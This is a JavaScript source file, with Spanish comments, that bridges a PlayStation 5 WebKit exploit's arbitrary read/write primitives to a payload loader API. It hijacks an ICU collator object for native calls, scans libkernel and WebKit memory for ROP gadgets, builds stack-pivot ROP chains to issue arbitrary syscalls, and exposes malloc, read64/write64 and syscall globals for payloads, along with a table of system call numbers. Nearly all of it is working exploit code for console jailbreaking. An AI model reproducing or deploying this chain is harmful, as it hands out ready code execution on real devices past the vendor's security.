// 2026-09-11 bridge.js — puente primitivas mansoor0x -> API del loader Y2JB.
// Expone los globales que consumen DEMO/payloads/*-1320.js SIN reescribirlos:
//   malloc/free, read8/16/32/64, write8/16/32/64, syscall, SYSCALL,
//   get_error_string, send_notification, log, toHex.
// Primitivas base del POC (handoff en exploit.js -> window.__PS5_CTX):
//   * RW arbitraria: ctx.aim(addr) + ctx.view() (ventana de 0x100 bytes).
//   * Llamada nativa natural (pila ICU intacta, retorno limpio): rearme del
//     UCollator falso (B=arena+0x100): [B+0xE0]=callee, [B+0x48]=rdi,
//     [B+0x60]=rcx; rsi/rdx salen de la cadena pasada a compare().
// syscall(): modo ROP si el escaneo de libkernel encuentra los gadgets; si no,
// modo directo (solo llamadas cuyo 2er arg kernel puede ser basura).
"use strict";
(function (global) {
    const PS5 = {
        ready: false, mode: "NONE", fw: "??.??",
        webkitBase: null, libkernelBase: null,
        gadgets: null, stubs: null, stubMode: false,
        mallocEnd: 0, notes: [],
    };
    global.PS5 = PS5;

    let ctx = null;
    let heapPtr = 0, heapEnd = 0, chainBase = 0;
    let lastErr = 0;
    const CH = 0x100; // ventana por aim

    // ---------- helpers ----------
    const N = (a) => typeof a === "bigint" ? Number(a) : a;
    const B = (a) => typeof a === "bigint" ? a : BigInt(a || 0);
    const HEX = (x) => "0x" + B(x).toString(16);
    const ELM = {
        1: "EPERM", 2: "ENOENT", 9: "EBADF", 12: "ENOMEM", 13: "EACCES",
        14: "EFAULT", 16: "EBUSY", 17: "EEXIST", 22: "EINVAL", 28: "ENOSPC",
        35: "EAGAIN", 38: "ENOTEMPTY", 45: "EOPNOTSUPP", 55: "ENOEXEC",
        63: "ENAMETOOLONG", 78: "ENOSYS", 89: "ENOTSUP", 93: "ENOTCAPABLE",
        94: "ECAPMODE",
    };

    // [Mods consola] Log remoto unificado con el runtime Y2JB: POST al
    // log_server.py del PC (puerto 8080). Configurable y auto-descubierto:
    //   1) window.LOG_SERVER (lo fija setlogserver.js del runtime, o ?logserver=)
    //   2) http://<host-de-la-pagina>:8080/log  (sin esquema/relativo -> 404)
    // Si no hay servidor no pasa nada: solo se pierde telemetria, nunca rompe.
    let LOG_SERVER = (function () {
        try {
            const qp = new URLSearchParams(location.search).get("logserver");
            if (qp) return qp;
            if (typeof window !== "undefined" && window.LOG_SERVER) return window.LOG_SERVER;
            return "http://" + location.hostname + ":8080/log";
        } catch (e) { return ""; }
    })();
    let logRemoteOK = false;
    function httpLog(line) {
        if (!LOG_SERVER) return;
        try {
            const x = new XMLHttpRequest();
            x.open("POST", LOG_SERVER, true);
            x.setRequestHeader("Content-Type", "text/plain");
            x.send(String(line));
            logRemoteOK = true;
        } catch (e) {}
    }
    async function log(msg) {
        const s = String(msg);
        console.log(s);
        httpLog(s);
        try { if (typeof global.__psaitoAppend === "function") global.__psaitoAppend(s); } catch (e) {}
        // Append con scroll "pegajoso": solo baja al fondo si el usuario ya
        // estaba abajo, para poder revisar lineas anteriores en pantalla.
        const appendSticky = (id, cap) => {
            try {
                const d = document.getElementById(id);
                if (!d) return;
                const atBottom = d.scrollHeight - d.scrollTop - d.clientHeight < 24;
                d.textContent = (d.textContent + "\n" + s).split("\n").slice(-cap).join("\n");
                if (atBottom) d.scrollTop = d.scrollHeight;
            } catch (e) {}
        };
        appendSticky("scr", 2000);
        appendSticky("plg", 2000);
    }
    global.log = log;
    global.toHex = (x) => HEX(x);

    // ---------- RW arbitraria (chunked sobre aim+view) ----------
    // Tras aim(x) la ventana cubre exactamente [x, x+0x100). Para no cruzar
    // frontera de pagina 4K (paginas no mapeadas = fault), cortamos en el borde.
    function chunkN(addr, off, left) {
        const toPage = CH - ((addr + off) % CH);
        return Math.min(toPage, left);
    }
    function rdBytes(addr, len) {
        addr = N(addr);
        const out = new Uint8Array(len);
        let off = 0;
        while (off < len) {
            const n = chunkN(addr, off, len - off);
            const v = ctx.aim(addr + off);
            for (let i = 0; i < n; ++i) out[off + i] = v[i];
            off += n;
        }
        return out;
    }
    function wrBytes(addr, data) {
        addr = N(addr);
        let off = 0;
        while (off < data.length) {
            const n = chunkN(addr, off, data.length - off);
            const v = ctx.aim(addr + off);
            for (let i = 0; i < n; ++i) v[i] = data[off + i];
            off += n;
        }
    }
    function pack(v, w) {
        v = BigInt.asUintN(64, B(v));
        const o = new Uint8Array(w);
        // la mascara se aplica en BigInt: Number() de un qword completo
        // perderia precision en los bytes bajos
        for (let i = 0; i < w; ++i)
            o[i] = Number((v >> BigInt(8 * i)) & 0xffn);
        return o;
    }
    function unpack(u8) {
        let v = 0n;
        for (let i = u8.length - 1; i >= 0; --i) v = (v << 8n) | BigInt(u8[i]);
        return v;
    }
    function readW(addr, w) { return unpack(rdBytes(addr, w)); }
    function writeW(addr, w, val) { wrBytes(addr, pack(val, w)); }

    const read8 = (a) => Number(readW(a, 1));
    const read16 = (a) => Number(readW(a, 2));
    const read32 = (a) => Number(readW(a, 4));
    const read64 = (a) => readW(a, 8);
    const write8 = (a, v) => writeW(a, 1, v);
    const write16 = (a, v) => writeW(a, 2, v);
    const write32 = (a, v) => writeW(a, 4, v);
    const write64 = (a, v) => writeW(a, 8, v);

    // ---------- heap: bump allocator dentro de la arena del exploit ----------
    // [arena+0x100]=UCollator falso, [arena+0x300]=vtable, [0x430..) libre:
    // heap del payload en [0x2000, 0x8000), cadena ROP en [0x8000, 0x8100).
    function malloc(size) {
        size = N(size);
        size = (size + 7) & ~7;
        if (size < 8) size = 8;
        if (heapPtr + size > heapEnd) {
            PS5.notes.push("heap-overflow " + size);
            return 0n;
        }
        const p = BigInt(ctx.arenaBacking + heapPtr);
        heapPtr += size;
        wrBytes(p, new Uint8Array(Math.min(size, 0x100))); // zero-init barato
        if (size > 0x100) wrBytes(p + BigInt(0x100), new Uint8Array(size - 0x100));
        return p;
    }
    function free(p) { /* bump allocator: no-op */ }

    function alloc_string(s) {
        s = String(s);
        const p = malloc(s.length + 1);
        if (!p) return 0n;
        const u = new Uint8Array(s.length + 1); // ya incluye el NUL final
        for (let i = 0; i < s.length; ++i) u[i] = s.charCodeAt(i) & 0xff;
        wrBytes(p, u);
        return p;
    }

    // ---------- llamada nativa natural via collator re-armado ----------
    function swapIn() {
        const v = ctx.aim(ctx.collatorCell + 0x18); // m_collator
        const p = pack(ctx.fakeCollator, 6);
        for (let i = 0; i < 6; ++i) v[i] = p[i];
        v[6] = 0; v[7] = 0;
    }
    function swapOut() {
        const v = ctx.aim(ctx.collatorCell + 0x18);
        for (let i = 0; i < ctx.collatorSaved.length; ++i)
            v[i] = ctx.collatorSaved[i];
    }
    function nativeCall(target, rdi, rcx, req) {
        const A = ctx.arena;
        for (let i = 0; i < 8; ++i) {
            A[0x100 + 0x48 + i] = Number(B(rdi) >> BigInt(8 * i)) & 0xff;
            A[0x100 + 0x60 + i] = Number(B(rcx) >> BigInt(8 * i)) & 0xff;
            A[0x100 + 0xE0 + i] = Number(B(target) >> BigInt(8 * i)) & 0xff;
        }
        swapIn();
        try {
            return ctx.compare(req === undefined ? "" : String(req));
        } finally {
            swapOut();
        }
    }

    // ---------- notify (la prueba original del POC, reutilizable) ----------
    function send_notification(msg) {
        try {
            const r = nativeCall(ctx.notifyEntry, 0, 0, ctx.requestPadded(msg));
            return r === 0;
        } catch (e) { return false; }
    }

    // ---------- escaneo de gadgets en libkernel .text ----------
    const KTEXT = 0x44000;
    const GADPAT = {
        poprax:  [0x58, 0xc3],
        poprdi:  [0x5f, 0xc3],
        poprsi:  [0x5e, 0xc3],
        poprdx:  [0x5a, 0xc3],
        popr10:  [0x41, 0x5a, 0xc3],
        popr8:   [0x41, 0x58, 0xc3],
        popr9:   [0x41, 0x59, 0xc3],
        poprsp:  [0x5c, 0xc3],
        ret:     [0xc3],
        syscall: [0x0f, 0x05, 0xc3],
        store:   [0x48, 0x89, 0x07, 0xc3],      // mov [rdi],rax; ret
        save:    [0x48, 0x89, 0x27, 0xc3],      // mov [rdi],rsp; ret
        pivot:   [0x48, 0x89, 0xe7, 0xc3],      // mov rsp,rdi; ret
    };
    const PIVOT_ALT = [[0x48, 0x8b, 0xe7, 0xc3], [0x57, 0x5c, 0xc3]]; // mov rsp,rdi / push rdi;pop rsp
    function findPat(mem, base, pat) {
        outer:
        for (let i = 0; i + pat.length <= mem.length; ++i) {
            for (let j = 0; j < pat.length; ++j)
                if (mem[i + j] !== pat[j]) continue outer;
            return base + i;
        }
        return null;
    }
    function scanGadgets() {
        const g = {};
        const kbase = (PS5.libkernelBase > 0x800000000 && PS5.libkernelBase < 0x900000000)
            ? PS5.libkernelBase : ctx.libkernelBase;
        const CHUNK = 0x2000, OVER = 16;
        for (let off = 0; off < KTEXT; off += CHUNK) {
            // cada chunk se extiende OVER bytes mas alla para no perder
            // gadgets que cruzan la frontera
            const mem = rdBytes(kbase + off, lenFor(off));
            const memBase = kbase + off;
            for (const k in GADPAT) {
                if (g[k] !== undefined && g[k] !== null) continue;
                const f = findPat(mem, memBase, GADPAT[k]);
                if (f !== null) g[k] = f;
            }
            if (g.pivot === null || g.pivot === undefined) {
                for (const alt of PIVOT_ALT) {
                    const f = findPat(mem, memBase, alt);
                    if (f !== null) { g.pivot = f; break; }
                }
            }
        }
        PS5.gadgets = g;
        const missing = Object.keys(GADPAT).concat(["pivot"]).filter(
            (k) => g[k] === undefined || g[k] === null);
        if (missing.length) {
            PS5.notes.push("rop-missing:" + missing.join(","));
            return false;
        }
        return true;
    }
    function lenFor(off) { return Math.min(0x2000 + 16, KTEXT - off); }
    // [Mods consola] El escaneo de gadgets LEE el .text de libkernel, que post-init
    // puede estar protegido (la sesion de consola documenta SIGSEGV al leer modulos
    // protegidos). Hacemos una sonda NO destructiva de 1 byte: si `aim` falla o no
    // hay base, NO escaneamos y caemos a modo DIRECT (solo notify/nativeCall, que es
    // lo unico que el POC valida sin leer text). `?rop=0` fuerza DIRECT siempre.
    function ropProbe() {
        const qp = (function () {
            try { return new URLSearchParams(location.search).get("rop"); }
            catch (e) { return null; }
        })();
        if (qp === "0") { PS5.notes.push("rop-forced-direct"); return false; }
        const base = (PS5.libkernelBase > 0x800000000 && PS5.libkernelBase < 0x900000000)
            ? PS5.libkernelBase : ctx.libkernelBase;
        if (!(base > 0x800000000 && base < 0x900000000)) {
            // Causa mas comun en firmwares interpolados: el exploit no valido el
            // libkernel base (offsets gps/cls/ers no coinciden) y publico base
            // no valida. Se anota el valor real para diagnostico en panel/log.
            PS5.notes.push("rop-no-libkernel-base:" + HEX(base || 0)
                + " (offsets 13.x no validaron)");
            return false;
        }
        try {
            const v = ctx.aim(base);   // 1 byte: primer byte de .text
            if (v === null || v === undefined) {
                PS5.notes.push("rop-probe-null");
                return false;
            }
            PS5.notes.push("rop-probe-ok:0x" + (v[0] & 0xff).toString(16));
            return true;
        } catch (e) {
            PS5.notes.push("rop-probe-threw:" + String(e.message || e).slice(0, 40));
            return false;
        }
    }

    // ---------- [Mods X1NON] fallback con gadgets de WebKit + stubs ----------
    // Si el escaneo de libkernel falla (.text protegido post-init), usamos:
    //   - gadgets VERIFICADOS de libSceNKWebKit (tabla X1NON 13.XX, validados
    //     byte a byte: WebKit es el modulo propio del proceso y es legible),
    //   - los STUBS C de libkernel por numero de syscall (ejecutados via ROP
    //     SIN leer libkernel: solo se salta a base+rva).
    // La cadena resultante soporta los 6 args del wrapper C (rdi,rsi,rdx,rcx,
    // r8,r9; el stub mueve rcx->r10 internamente).
    const WEBKIT_TEXT_SIZE = 0x2c7c000;
    const WK_PATTERNS = {
        poprdi: [0x5f, 0xc3], poprsi: [0x5e, 0xc3], poprdx: [0x5a, 0xc3],
        poprcx: [0x59, 0xc3], poprax: [0x58, 0xc3], poprsp: [0x5c, 0xc3],
        popr8: [0x41, 0x58, 0xc3], popr9: [0x41, 0x59, 0xc3],
        store: [0x48, 0x89, 0x07, 0xc3], ret: [0xc3],
    };
    const WK_NAME = {
        poprdi: "pop rdi", poprsi: "pop rsi", poprdx: "pop rdx",
        poprcx: "pop rcx", poprax: "pop rax", poprsp: "pop rsp",
        popr8: "pop r8", popr9: "pop r9",
        store: "mov [rdi], rax", ret: "ret",
    };
    function pickX1non() {
        try {
            const T = (typeof window !== "undefined") ? window.X1NON_13X : null;
            if (!T) { PS5.notes.push("wk-no-table"); return null; }
            if (T[PS5.fw]) return T[PS5.fw];
            const parts = String(PS5.fw).split(".");
            const want = parseInt(parts[0], 10) * 100 + parseInt(parts[1] || "0", 10);
            const maj = parts[0];
            let best = null, bestD = 1e9;
            for (const k in T) {
                if (k.split(".")[0] !== maj) continue;
                const p = k.split(".");
                const n = parseInt(p[0], 10) * 100 + parseInt(p[1], 10);
                const d = Math.abs(n - want);
                if (d < bestD) { bestD = d; best = k; }
            }
            if (best) { PS5.notes.push("wk-nearest:" + best); return T[best]; }
        } catch (e) { PS5.notes.push("wk-pick-threw"); }
        PS5.notes.push("wk-no-table");
        return null;
    }
    function scanWkPattern(pat) {
        const CHUNK = 0x2000;
        const base = (PS5.libkernelBase > 0x800000000 && PS5.libkernelBase < 0x900000000)
            ? PS5.libkernelBase : ctx.libkernelBase; // no usado; wk usa webkit
        for (let off = 0; off < WEBKIT_TEXT_SIZE; off += CHUNK) {
            let mem;
            try { mem = rdBytes(ctx.webkitBase + off, Math.min(CHUNK + 16, WEBKIT_TEXT_SIZE - off)); }
            catch (e) { PS5.notes.push("wk-scan-fault@" + off.toString(16)); return null; }
            const f = findPat(mem, ctx.webkitBase + off, pat);
            if (f !== null) return f;
        }
        return null;
    }
    function tryWkFallback() {
        const x = pickX1non();
        if (!x) return false;
        const kbase = (PS5.libkernelBase > 0x800000000 && PS5.libkernelBase < 0x900000000)
            ? PS5.libkernelBase : ctx.libkernelBase;
        if (!(kbase > 0x800000000 && kbase < 0x900000000)) {
            PS5.notes.push("wk-no-libkernel-base");
            return false;
        }
        // sonda no destructiva: 1 byte del .text de WebKit
        try {
            const p = ctx.aim(ctx.webkitBase);
            if (p === null || p === undefined) { PS5.notes.push("wk-probe-null"); return false; }
            PS5.notes.push("wk-probe-ok");
        } catch (e) {
            PS5.notes.push("wk-probe-threw:" + String(e.message || e).slice(0, 40));
            return false;
        }
        const g = {};
        for (const key of Object.keys(WK_PATTERNS)) {
            const name = WK_NAME[key];
            const rva = x.wkGadgets[name];
            if (!rva) { PS5.notes.push("wk-missing-gadget:" + name); return false; }
            try {
                const v = ctx.aim(ctx.webkitBase + rva);
                const pat = WK_PATTERNS[key];
                for (let i = 0; i < pat.length; ++i) {
                    if ((v[i] & 0xff) !== pat[i]) {
                        PS5.notes.push("wk-bad-bytes:" + name);
                        return false;
                    }
                }
                g[key] = ctx.webkitBase + rva;
            } catch (e) {
                PS5.notes.push("wk-read-threw:" + name);
                return false;
            }
        }
        // pivot (mov rsp,rdi; ret = 48 8b e7 c3) y save (mov [rdi],rsp; ret =
        // 48 89 27 c3) NO estan en la tabla X1NON: busqueda dirigida en el
        // .text de WebKit (legible).
        g.pivot = scanWkPattern([0x48, 0x8b, 0xe7, 0xc3]);
        if (g.pivot === null) g.pivot = scanWkPattern([0x57, 0x5c, 0xc3]);
        if (g.pivot === null) { PS5.notes.push("wk-no-pivot"); return false; }
        g.save = scanWkPattern([0x48, 0x89, 0x27, 0xc3]);
        if (g.save === null) { PS5.notes.push("wk-no-save-gadget"); return false; }
        // stubs por numero de syscall: se EJECUTAN (no se leen)
        PS5.stubs = {};
        for (const numStr in x.syscallStubs)
            PS5.stubs[numStr] = kbase + x.syscallStubs[numStr];
        PS5.gadgets = g;
        PS5.stubMode = true;
        PS5.notes.push("wk-mode-ok:stubs=" + Object.keys(PS5.stubs).length
            + " pivot=0x" + g.pivot.toString(16));
        return true;
    }

    // ---------- syscall modo ROP ----------
    // cadena (20 qwords en arena+0x8000): pivote a rdi=chain; pop rax=num;
    // pop rdi..r9=args; syscall(0f05c3); pop rdi=&res; store(mov [rdi],rax);
    // pop rsp=R0 (guardado antes con save-gadget); ret -> reentra ICU limpio.
    const OFF_RES = 0x480, OFF_R0 = 0x488;
    function syscallROP(num, args) {
        const g = PS5.gadgets;
        // 1) capturar rsp real de ICU
        nativeCall(g.save, ctx.arenaBacking + OFF_R0, 0, "");
        const R0 = Number(read64(ctx.arenaBacking + OFF_R0));
        if (!(R0 > 0x100000000 && R0 < 0x1000000000000))
            throw new Error("rsp-garbage:" + HEX(R0));
        // 2) montar cadena
        let S;
        if (PS5.stubMode) {
            // [Mods X1NON] cadena por STUBS: sin gadget syscall ni pop rax.
            // Se salta al wrapper C de libkernel (base+rva) con los 6 args en
            // rdi,rsi,rdx,rcx,r8,r9 (el wrapper mueve rcx->r10 internamente).
            const stub = PS5.stubs && PS5.stubs[String(num)];
            if (stub === undefined)
                throw new Error("syscall-" + num + "-no-stub-in-table");
            S = [
                g.poprdi, Number(B(args[0] === undefined ? 0 : args[0])),
                g.poprsi, Number(B(args[1] === undefined ? 0 : args[1])),
                g.poprdx, Number(B(args[2] === undefined ? 0 : args[2])),
                g.poprcx, Number(B(args[3] === undefined ? 0 : args[3])),
                g.popr8, Number(B(args[4] === undefined ? 0 : args[4])),
                g.popr9, Number(B(args[5] === undefined ? 0 : args[5])),
                Number(B(stub)),
                g.poprdi, ctx.arenaBacking + OFF_RES,
                g.store,
                g.poprsp,
                R0,
            ];
        } else {
            S = new Array(20).fill(0);
            S[0] = g.poprax; S[1] = num;
            const pops = [g.poprdi, g.poprsi, g.poprdx, g.popr10, g.popr8, g.popr9];
            for (let i = 0; i < 6; ++i) {
                S[2 + i * 2] = pops[i];
                S[3 + i * 2] = Number(B(args[i] === undefined ? 0 : args[i]));
            }
            S[14] = g.syscall;
            S[15] = g.poprdi; S[16] = ctx.arenaBacking + OFF_RES;
            S[17] = g.store;
            S[18] = g.poprsp;
            // el save-gadget (mov [rdi],rsp) ejecuta ANTES de su ret: guarda el
            // rsp de entrada (puntero a la antigua dir. de retorno de ICU). El
            // ret de la cadena reentra ICU exactamente.
            S[19] = R0;
        }
        const q = new Uint8Array(S.length * 8);
        for (let i = 0; i < S.length; ++i) {
            const p = pack(S[i], 8);
            for (let j = 0; j < 8; ++j) q[i * 8 + j] = p[j];
        }
        const CB = ctx.arenaBacking + chainBase;
        wrBytes(CB, q);
        // 3) ejecutar (rdi = direccion de la cadena para el pivote)
        nativeCall(g.pivot, CB, 0, "");
        const r = read64(ctx.arenaBacking + OFF_RES);
        const rs = BigInt.asIntN(64, r);
        // convencion del loader Y2JB: error => -1n + errno en get_error_string
        // (los payloads comparan r===-1n y luego EN()); exito => rax tal cual.
        if (rs < 0n && rs > -132n) {
            lastErr = Number(-rs);
            return -1n;
        }
        lastErr = 0;
        return rs;
    }
    // modo directo: sin gadgets no se puede fijar rax + args numerico-1er.
    // Solo notify/nativeCall siguen operativas; syscall() falla claro.
    function syscallDirect(num, args) {
        throw new Error("syscall-" + num + "-unavailable:rop-gadgets-missing");
    }
    // [Mods consola] Tabla Orbis real (fuente: global.js del runtime Y2JB 1.7).
    // Los numeros deben ser EXACTOS: la tabla anterior tenia inventados/ausentes
    // (kill, getuid, thr_self, umtx_op, sysctl, dlsym...). Solo se anaden las
    // entradas con numero confirmado; las dudosas llevan comentario.
    const SYSN = {
        read: 0x3, write: 0x4, open: 0x5, close: 0x6, unlink: 0xa,
        chmod: 0xf, getpid: 0x14, kill: 0x25, pipe: 0x2a,
        ioctl: 0x36, munmap: 0x49, mprotect: 0x4a, fcntl: 0x5c,
        select: 0x5d, dup2: 0x5a, fsync: 0x5f, socket: 0x61,
        connect: 0x62, bind: 0x68, setsockopt: 0x69, listen: 0x6a,
        getsockopt: 0x76, getsockname: 0x20, netgetiflist: 0x7d,
        sendto: 0x85, recvfrom: 0x1d, accept: 0x1e, mkdir: 0x88,
        rmdir: 0x89, rename: 0x80, stat: 0xbc, fstat: 0xbd,
        getdents: 0x110, sysctl: 0xca, nanosleep: 0xf0,
        sched_yield: 0x14b, sigaction: 0x1a0, thr_self: 0x1b0,
        thr_new: 0x1c7, thr_exit: 0x1af, umtx_op: 0x1c6,
        dlsym: 0x24f, dynlib_load_prx: 0x252, dynlib_unload_prx: 0x253,
        randomized_path: 0x25a, is_in_sandbox: 0x249, mmap: 0x1dd,
        lseek: 0x1de, ftruncate: 0x1e0, jitshm_create: 0x215,
        jitshm_alias: 0x216, cpuset_getaffinity: 0x1e7,
        cpuset_setaffinity: 0x1e8, rtprio_thread: 0x1d2,
    };
    function syscall(which, ...args) {
        let num = which;
        if (typeof which === "string" || (typeof which !== "number" && typeof which !== "bigint"))
            num = SYSN[String(which)] !== undefined ? SYSN[String(which)] : which;
        num = Number(B(num));
        if (PS5.mode === "ROP") return syscallROP(num, args);
        return syscallDirect(num, args);
    }
    function get_error_string() {
        return lastErr + ": " + (ELM[lastErr] || "");
    }

    // ---------- arranque ----------
    function boot(c) {
        ctx = c;
        PS5.fw = c.fw;
        PS5.webkitBase = c.webkitBase;
        PS5.libkernelBase = c.libkernelBase;
        // [Mods consola] Diagnostico de offsets: si la base publicada esta fuera
        // de banda, revisar las candidatas por import (getpid/close/error). Si
        // una cae en banda y alineada, se registra y se usa para el escaneo:
        // asi un solo offset interpolado erroneo no mata el modo ROP.
        try {
            const kb = c.libkernelBase;
            const inBand = (x) => x > 0x800000000 && x < 0x900000000 && (x % 0x4000 === 0);
            if (!inBand(kb) && c.kernelBaseCandidates) {
                const cds = c.kernelBaseCandidates;
                const list = [["getpid", cds.getpid], ["close", cds.close], ["error", cds.error]];
                PS5.notes.push("kbase-candidates:"
                    + list.map(([n, v]) => n + "=" + HEX(v)).join(","));
                for (const [n, v] of list) {
                    if (inBand(v)) {
                        PS5.notes.push("kbase-recovered-from:" + n + "=" + HEX(v));
                        PS5.libkernelBase = v;
                        break;
                    }
                }
            }
        } catch (e) { PS5.notes.push("kbase-diag-threw:" + String(e.message || e).slice(0, 40)); }
        heapPtr = 0x2000; heapEnd = 0x8000; chainBase = 0x8000;
        PS5.mallocEnd = heapEnd;
        // cabecera sanity: la arena debe ver el centinela "ROP1" en +0xf00
        try {
            if (ctx.arena[0xf00] === 0x52 && ctx.arena[0xf03] === 0x31)
                PS5.notes.push("arena-sentinel-ok");
        } catch (e) {}
        let ropOK = false;
        try { if (ropProbe()) ropOK = scanGadgets(); }
        catch (e) { PS5.notes.push("scan-threw:" + String(e.message || e).slice(0, 60)); }
        if (!ropOK) {
            // [Mods X1NON] la via libkernel fallo (base invalida, probe o
            // escaneo): intentamos gadgets de WebKit + stubs por syscall.
            try { ropOK = tryWkFallback(); }
            catch (e) { PS5.notes.push("wk-fb-threw:" + String(e.message || e).slice(0, 60)); }
        }
        PS5.mode = ropOK ? "ROP" : "DIRECT";
        PS5.ready = true;

        global.malloc = malloc;
        global.free = free;
        global.alloc_string = alloc_string;
        global.read8 = read8; global.read16 = read16;
        global.read32 = read32; global.read64 = read64;
        global.write8 = write8; global.write16 = write16;
        global.write32 = write32; global.write64 = write64;
        global.syscall = syscall;
        global.SYSCALL = SYSN;
        global.SYSCALL_STUBS = PS5.stubs;   // [Mods X1NON] rva absolutos por num (o null)
        global.get_error_string = get_error_string;
        global.send_notification = send_notification;
        global.PS5call = nativeCall;

        try {
            const pid = syscall(SYSN.getpid);
            send_notification("userland-bridge OK fw=" + PS5.fw + " pid=" + pid + " modo=" + PS5.mode);
            httpLog("BRIDGE-BOOT fw=" + PS5.fw + " mode=" + PS5.mode
                + " wk=" + HEX(c.webkitBase) + " libk=" + HEX(c.libkernelBase)
                + " pid=" + pid + " notes=" + PS5.notes.join(";"));
        } catch (e) {
            httpLog("BRIDGE-BOOT-PARTIAL " + String(e.message || e));
        }
        if (typeof global.onBridgeReady === "function") {
            try { global.onBridgeReady(PS5); } catch (e) {}
        }
    }

    global.onUserland = function () { boot(window.__PS5_CTX); };
})(typeof window !== "undefined" ? window : globalThis);
